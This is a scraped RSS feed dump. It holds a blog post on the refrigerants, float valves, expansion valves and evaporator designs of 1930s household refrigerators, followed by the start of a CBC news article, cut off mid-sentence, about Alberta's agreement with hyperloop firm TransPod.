<p>One of the most noticeable differences between refrigerators in the mid 1930s and today was the refrigerants they used and the refrigerants charges required for operation. &nbsp;A very common refrigerant, Sulpher Dioxide had been in use fora number of years and still appeared to dominate the market at this time, not to say that proprietary chemical refrigerants weren’t beginning to take a large part of the market. &nbsp;F-12 was one of these proprietary substances that would later dominate the refrigerator industry. &nbsp;It was stable up to high temperatures, didn’t stink like SO2 when it leaked, was relatively safe if exposure to it was kept to a minimum, and it has a much lower boiling point than several common refrigerants at the time which means that systems operating F-12 remained in a positive pressure state throughout the cycle. &nbsp;Refrigerators with F-114, SO2, Isobutane and Methyl Formate required a vacuum in the low side of a vapor compression system. &nbsp;This was generally viewed as problematic seeing that if a leak formed in the low side of the system, for instance, around the packing seal of an open drive compressor, atmosphere would leak into the system, bringing non-condensable gases and water vapor. &nbsp;This leads to high head pressures, oil contamination, possible acid formation, corrosion and refrigerant control freeze ups. &nbsp;A curious refrigerant used rarely was Carrene, also known as Dichloromethane which has a boiling point of 104 degrees F at atmospheric pressure. &nbsp;This means both the suction and discharge sides of a system would operate in a vacuum state. &nbsp;Very curious. &nbsp;As I said, the refrigerant charges were unusual as well. &nbsp;The compressors of these systems were rated not much &nbsp;larger than modern day compressors from 1/16 HP up to 1/4 HP, but they had typical charges of 1# to perhaps 3.5# &nbsp;and more depending on the manufacturer. &nbsp;Modern refrigerators have charges measured in ounces, perhaps, 4 oz.. Most of these machines had liquid receivers that held excess refrigerant and ensured a pure liquid supply to the refrigerant control. &nbsp;That excess refrigerant would have allowed continued operation with minor leaks in the system. &nbsp;Another reason for the large charges is the construction of the evaporator which was commonly gravity flooded; a vessel and series of tubes holding refrigerant under low pressure, boiling away to vapor as heat is absorbed from the refrigerated cabinet.<span id="more-4087"></span></p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg"><img data-attachment-id="4080" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/frigidaire_lsf_evaporator/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg" data-orig-size="2219,1522" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067405&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.00095419847328244&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Frigidaire_LSF_Evaporator" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=300" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=605" alt="Frigidaire_LSF_Evaporator" src="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=605&amp;h=415" srcset="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=605&amp;h=415 605w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=1210&amp;h=830 1210w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=150&amp;h=103 150w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=300&amp;h=206 300w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=768&amp;h=527 768w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_lsf_evaporator.jpg?w=1024&amp;h=702 1024w" sizes="(max-width: 605px) 100vw, 605px"></a></p>
<p>Above, is one of these low side float assemblies. &nbsp;These seemed to be falling out of favor by the mid 1930s for various reason having to do with expense and reliability. &nbsp;The float valve simply regulated the volume of liquid refrigerant within the evaporator shell which was maintained at suction pressure. &nbsp;As the refrigerant boiled away and was carried to the compressor, the ball would drop, valve open and additional high pressure liquid would be admitted. &nbsp;When implemented properly, the low side float gravity flooded evaporator has many advantages over the high side float or the dry type evaporator. &nbsp;It was very important that these machines were properly leveled when installed. &nbsp;They definitely had a minimum charge volume below which the float valve would continually call for more refrigerant and when it was not available, the valve would remain open, leaving very little pressure drop between the high and low side resulting in little to no refrigerating effect. &nbsp;A large refrigerant charge could simply be handled with a sufficiently sized liquid receiver. &nbsp;(Also read <a href="https://musingsonentropy.wordpress.com/2013/04/18/the-great-gravity-flooded-evaporator/" target="_blank">The Great Gravity Flooded Evaporator</a>)</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg"><img data-attachment-id="4079" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/frigidaire_low_side_float/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg" data-orig-size="2298,1181" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067395&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.00068870523415978&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Frigidaire_Low_Side_Float" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=300" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=605" alt="Frigidaire_Low_Side_Float" src="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=605&amp;h=310" srcset="https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=603&amp;h=310 603w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=1206&amp;h=620 1206w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=150&amp;h=77 150w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=300&amp;h=154 300w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=768&amp;h=395 768w, https://musingsonentropy.files.wordpress.com/2013/04/frigidaire_low_side_float.jpg?w=1024&amp;h=526 1024w" sizes="(max-width: 605px) 100vw, 605px"></a>Nearly the same valve assembly, but removed from the evaporator housing. &nbsp;The baffle plate depicted helped to prevent the violent, boiling liquid refrigerant from being carried back the suction tube to the compressor. &nbsp;Some compressor oils would form a thin film on top of the refrigerant and would need carried back to the compressor. &nbsp;Various methods for this were devised; this Frigidaire obviously had a carefully placed hole in the suction tube for the purpose.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg"><img data-attachment-id="4074" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/bucket_float_valve/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg" data-orig-size="2216,965" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067430&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0012787723785166&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Bucket_Float_Valve" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg?w=300" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg?w=605" alt="Bucket_Float_Valve" src="https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg?w=605&amp;h=262" srcset="https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg?w=602&amp;h=262 602w, https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg?w=150&amp;h=65 150w, https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg?w=300&amp;h=131 300w, https://musingsonentropy.files.wordpress.com/2013/04/bucket_float_valve.jpg?w=768&amp;h=334 768w" sizes="(max-width: 605px) 100vw, 605px"></a>Another low side float valve assembly. &nbsp;It’s a beautiful illustration isn’t it? &nbsp;I read a patent on this type, and one of the advantages cited was that with an open, floating pan, the whole device is under equal pressure, there is no worry of it’s reliable operation, unlike&nbsp;a sealed ball float. &nbsp;The other use of the pan, as I think is well illustrated, is it’s use to collect oil vapors and collect them in the bottom for return to the compressor via the suction tube. &nbsp;I believe this float valve needle and valve seat can be removed and serviced without taking out the entire float assembly.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg"><img data-attachment-id="4085" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/norge_cycle_color/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg" data-orig-size="2865,2300" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067913&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0012787723785166&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Norge_Cycle_Color" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=300" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=605" alt="Norge_Cycle_Color" src="https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=605&amp;h=485" srcset="https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=605&amp;h=485 605w, https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=1208&amp;h=970 1208w, https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=150&amp;h=120 150w, https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=300&amp;h=241 300w, https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=768&amp;h=617 768w, https://musingsonentropy.files.wordpress.com/2013/04/norge_cycle_color.jpg?w=1024&amp;h=822 1024w" sizes="(max-width: 605px) 100vw, 605px"></a></p>
<p>A color illustration from “Modern Electric and Gas Refrigeration” by Althouse and Turnquist, 1933. &nbsp;Notable features: &nbsp;Pan Type Low SIde Float, Open Drive Rotary Compressor.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg"><img data-attachment-id="4077" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/electrolux_cycle_color/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg" data-orig-size="2067,2794" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365068022&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0013227513227513&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Electrolux_Cycle_Color" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=222" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=605" alt="Electrolux_Cycle_Color" src="https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=605&amp;h=817" srcset="https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=605&amp;h=817 605w, https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=1210&amp;h=1634 1210w, https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=111&amp;h=150 111w, https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=222&amp;h=300 222w, https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=768&amp;h=1038 768w, https://musingsonentropy.files.wordpress.com/2013/04/electrolux_cycle_color.jpg?w=758&amp;h=1024 758w" sizes="(max-width: 605px) 100vw, 605px"></a>From the same 1933 book, this Electrolux diagram has some neat features. &nbsp;It’s an open drive reciprocating compressor probably with a fan cooled condenser. &nbsp;Most domestic units were fan cooled by this time. &nbsp;Early in the 20s, the higher head pressures associated with atmospheric condensers made water cooled condensers more common. &nbsp;WIth the addition of condenser cooling fins and the increased air flow from fans tied to higher speed electric motors, air cooling became more practical. &nbsp;This unit has a curious evaporator. &nbsp;All though it has a low side float, the evaporator coil is one continuous loop like a dry type evaporator. &nbsp;This could lead to vapor pockets forming and elevated pressures over the suction pressure, decreasing the rate of ebullition. &nbsp;Another interesting feature being the extra loop or two in the suction line to vaporize any liquid refrigerant in the suction line.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg"><img loading="lazy" data-attachment-id="4076" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/crane_ge_monitor_top/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg" data-orig-size="1237,2413" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067582&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.00074626865671642&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Crane_GE_Monitor_Top" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg?w=154" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg?w=525" alt="Crane_GE_Monitor_Top" src="https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg?w=314&amp;h=614" width="314" height="614" srcset="https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg?w=314&amp;h=614 314w, https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg?w=628&amp;h=1225 628w, https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg?w=77&amp;h=150 77w, https://musingsonentropy.files.wordpress.com/2013/04/crane_ge_monitor_top.jpg?w=154&amp;h=300 154w" sizes="(max-width: 314px) 100vw, 314px"></a>A common GE Monitor Top type refrigerator. &nbsp;This “package type” construction was common where the entire refrigerating apparatus was modular in that it could be easily removed from the cabinet for service or replacement.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg"><img data-attachment-id="4075" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/coldspot_refrigerator_unit/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg" data-orig-size="2299,1912" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365066974&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0011627906976744&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Coldspot_Refrigerator_Unit" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=300" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=605" alt="Coldspot_Refrigerator_Unit" src="https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=605&amp;h=503" srcset="https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=605&amp;h=503 605w, https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=1210&amp;h=1006 1210w, https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=150&amp;h=125 150w, https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=300&amp;h=249 300w, https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=768&amp;h=639 768w, https://musingsonentropy.files.wordpress.com/2013/04/coldspot_refrigerator_unit.jpg?w=1024&amp;h=852 1024w" sizes="(max-width: 605px) 100vw, 605px"></a></p>
<p>This Coldspot has some features worth discussing. &nbsp;For one, it is the package type as described before with the compressor and condensing unit mounted atop the insulated cabinet top with the motor and compressor supported my springs to dampen vibration and noise. &nbsp;The evaporator is of the dry type where the refrigerant is fed to a long coil of tube or series of tubes at approximately the rate in which it is vaporized by the heat of the refrigerated cabinet. &nbsp;Some of the more crude early versions of this used a fixed orifice called a “restrictor”, having a fixed, triangle shaped opening to pass high pressure liquid refrigerant to the evaporator. &nbsp;Before the capillary tube came into use (invented in the late 20s) was the Automatic Expansion Valve which is little more than a pressure regulating valve maintaing a constant pressure within the evaporator coil, often with an adjustable spring compression. &nbsp;This knob or screw would often go out of adjustment because of the constant freeze/thaw occurring at these valves. &nbsp;They were often equipped with a rubber cap or boot to keep moisture from interfering with the adjustment. &nbsp;These AXVs work well in constant load conditions, but under high load tend to starve the evaporator of refrigerant and risk slugging liquid back to the compressor under low load. &nbsp;The improvement to these valves came with the addition of a thermostatic element or “sensor bulb” strapped to the suction line, the temperature of which alters the pressure within the the bulb and in turn, operates a diaphragm inside the valve to properly feed the correct amount of refrigerant to the coil given the conditions. &nbsp;This type of valve would be called a Thermostatic Expansion Valve.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg"><img data-attachment-id="4073" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/axv_dry_type/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg" data-orig-size="2146,2484" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067368&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0011574074074074&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="AXV_Dry_Type" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=259" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=605" alt="AXV_Dry_Type" src="https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=605&amp;h=700" srcset="https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=605&amp;h=700 605w, https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=1210&amp;h=1400 1210w, https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=130&amp;h=150 130w, https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=259&amp;h=300 259w, https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=768&amp;h=889 768w, https://musingsonentropy.files.wordpress.com/2013/04/axv_dry_type.jpg?w=885&amp;h=1024 885w" sizes="(max-width: 605px) 100vw, 605px"></a></p>
<p>A very simple dry type evaporator with and AXV. &nbsp;Notice the Thermostatic Control Switch. &nbsp;This has nothing to do with the refrigerant supply, but simply controls the electrical current to the compressor and allows the operator to adjust the cabinet temperature. &nbsp;These worked with a thermostatic bulb strapped to the evaporator, suction line or somewhere else in the cabinet. &nbsp;The Thermostat was a great improvement over the controls of the 20s which sometimes used a pressure operated switch tied into the suction line. &nbsp;The service or replacement of these complicated switches could involved breaking the sealed refrigerant line.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg"><img data-attachment-id="4072" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/axv_brine_chiller/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg" data-orig-size="2251,1545" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365066923&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.033333333333333&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="AXV_Brine_Chiller" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=300" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=605" alt="AXV_Brine_Chiller" src="https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=605&amp;h=415" srcset="https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=605&amp;h=415 605w, https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=1210&amp;h=830 1210w, https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=150&amp;h=103 150w, https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=300&amp;h=206 300w, https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=768&amp;h=527 768w, https://musingsonentropy.files.wordpress.com/2013/04/axv_brine_chiller.jpg?w=1024&amp;h=703 1024w" sizes="(max-width: 605px) 100vw, 605px"></a></p>
<p>An AXV on a dry type coil, but rather than direct expansion, this is a brine tank. &nbsp;The refrigerant tube passes through of a low freezing point brine which in turn froze ice cubes and chilled the space. &nbsp;These had the advantage of having a holdover effect to keep the cabinet cold and prevent short cycling of the compressor and also had a more constant loading effect on the AXV which made for more consistent and predictable performance. &nbsp;The down side of a brine system is the possible corrosive effects of the brine, extra cabinet space taken and the lower evaporator temperatures possibly needed to chill the brine to a temperature that it could in turn chill the refrigerator.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg"><img data-attachment-id="4083" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/ge_ck/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg" data-orig-size="2176,2571" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067164&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0014285714285714&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="GE_CK" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=254" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=605" alt="GE_CK" src="https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=605&amp;h=715" srcset="https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=605&amp;h=715 605w, https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=1210&amp;h=1430 1210w, https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=127&amp;h=150 127w, https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=254&amp;h=300 254w, https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=768&amp;h=907 768w, https://musingsonentropy.files.wordpress.com/2013/04/ge_ck.jpg?w=867&amp;h=1024 867w" sizes="(max-width: 605px) 100vw, 605px"></a></p>
<p>A GE Monitor Top style refrigerating unit. &nbsp;A hermetic system with what looks like a rotary compressor and oil pump lubricating pump. &nbsp;The …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/">https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/</a></em></p>]]>
            </description>
            <link>https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278184</guid>
            <pubDate>Wed, 26 Aug 2020 01:40:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alberta government to support feasibility study for Edmonton-Calgary hyperloop]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24278095">thread link</a>) | @GnarlyWhale
<br/>
August 25, 2020 | https://www.cbc.ca/news/canada/calgary/transpod-alberta-hyperloop-mou-1.5697848 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/calgary/transpod-alberta-hyperloop-mou-1.5697848">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Toronto-based TransPod has signed an agreement with the Alberta government that will see the province support the firm's early efforts to advance development of an&nbsp;ultra-high-speed transportation line between Calgary and Edmonton.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.4443903.1513038371!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/transpod-hyperloop.jpg"></p></div><figcaption>An illustration of what TransPod's hyperloop system might look like running beside a highway.<!-- --> <!-- -->( Radio-Canada/TransPod Hyperloop)</figcaption></figure><p><span><p>Canadian hyperloop&nbsp;company TransPod has signed an agreement with the Alberta government that will see the province support the firm's early efforts to advance development of an&nbsp;ultra-high-speed transportation line between Calgary and Edmonton.</p>  <p>Though the concept may still sound like&nbsp;science fiction, the company's ultimate goal is&nbsp;to have Albertans shuttling between Calgary and Edmonton in train-like pods — at speeds up to 1,000 kilometres an hour — through&nbsp;magnetic tubes by 2030.</p>  <p>On Tuesday, Toronto-based TransPod&nbsp;took a step forward by&nbsp;announcing it's&nbsp;inked&nbsp;a memorandum of understanding (MOU) with the province&nbsp;that will support the company in further studying the feasibility of the technology in Alberta, share transportation data and identify suitable land for a test track.</p>  <p>Alberta Transportation will also take part&nbsp;in discussions with potential large institutional investors "where suitable," according to the company.</p>  <p>The government hasn't made any&nbsp;financial commitments or endorsements.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5376040.1574898063!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/sebastien-gendron.jpeg 300w,https://i.cbc.ca/1.5376040.1574898063!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/sebastien-gendron.jpeg 460w,https://i.cbc.ca/1.5376040.1574898063!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/sebastien-gendron.jpeg 620w,https://i.cbc.ca/1.5376040.1574898063!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/sebastien-gendron.jpeg 780w,https://i.cbc.ca/1.5376040.1574898063!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/sebastien-gendron.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5376040.1574898063!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/sebastien-gendron.jpeg"></p></div><figcaption>Sebastien Gendron, co-founder and CEO of Transpod, says the new agreement signed with the Alberta government is a "huge" step.<!-- --> <!-- -->(Tony Seskus/CBC)</figcaption></figure></span></p>  <p>TransPod's&nbsp;chief&nbsp;executive said in an interview he sees the MOU as key. The announcement comes less than year after the company urged the UCP government <a href="https://www.cbc.ca/news/canada/calgary/alberta-hyperloop-calgary-edmonton-1.5375476">to climb aboard the idea.</a></p>  <p><em>"</em>It's actually the first, I would say,&nbsp;official support from the government of a province which belongs to a G7 country," said CEO Sebastien&nbsp;Gendron, "which is kind of a huge step to confirm the path to commercialization."</p>  <p>Transportation Minister Ric McIver said he's hopeful that TransPod's work will lead to the development of new technology that's put into&nbsp;practice in Alberta, creating new opportunities for job creation.</p>    <p>"I am excited about the possibilities," McIver said in an interview. <em>"</em>TransPod [wants] a chance to prove what they can do and I think Alberta is the place where we should let them prove it."</p>  <p>McIver said there's no commitment to provide&nbsp;government money, but he added that if TransPod&nbsp;proves the technology, they will "certainly help them tell their story<em>.</em>"</p>  <p>"We're going to try to be facilitators for them," he said.</p>  <p>If privately held TransPod realizes its 